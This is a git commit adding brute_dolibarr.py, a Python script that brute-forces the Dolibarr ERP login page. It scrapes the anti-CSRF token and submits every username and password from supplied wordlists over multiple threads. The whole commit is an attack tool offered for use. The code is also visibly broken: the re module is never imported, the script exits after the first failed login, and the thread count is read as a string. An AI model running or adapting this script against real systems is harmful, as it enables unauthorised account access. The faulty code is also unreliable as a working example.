1404eb1d82c1eedc53db893aa78180a2ebf16768
Dothelm <49758889+st3rv04ka@users.noreply.github.com>
2024-05-22 23:52:34 -0700

    Init

---
+++ brute_dolibarr.py
@@ -0,0 +1,66 @@
+import requests
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+URL = None
+USERNAMES_FILE = None
+PASSWORDS_FILE = None
+MAX_THREADS = 10 
+
+def login(session, url, token, username, password):
+    data = {
+        "token": token,
+        "username": username,
+        "password": password,
+        "actionlogin": "login"
+    }
+    r = session.post(f"{url}/", data=data, verify=False)
+
+    if "Logout" not in r.text:
+        print(f"[!] Authentication failed! {r.status_code}")
+        sys.exit(1)
+    else:
+        print(f"Login successful with username: {username} and password: {password}")
+        return True
+    return False
+
+def attempt_login(session, username, password):
+    r = session.get(URL)
+    token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", r.text).group(1).strip()
+    print(f"Request token: {token}")
+    if login(session, URL, token, username, password):
+        return True
+    return False
+
+def main():
+    session = requests.Session()
+
+    with open(USERNAMES_FILE, 'r') as uf:
+        usernames = [line.strip() for line in uf.readlines()]
+    
+    with open(PASSWORDS_FILE, 'r') as pf:
+        passwords = [line.strip() for line in pf.readlines()]
+    
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = []
+        for username in usernames:
+            for password in passwords:
+                futures.append(executor.submit(attempt_login, session, username, password))
+        
+        for future in futures:
+            if future.result():
+                print("Stopping further attempts as we have a successful login.")
+                executor.shutdown(wait=False)
+                return
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("Usage: python3 dolibarr.py http://dolibarr.stf usernames_file passwords_file threads_count")
+        sys.exit(1)
+    URL = sys.argv[1]
+    USERNAMES_FILE = sys.argv[2]
+    PASSWORDS_FILE = sys.argv[3]
+    MAX_THREADS = sys.argv[4]
+    main()
+
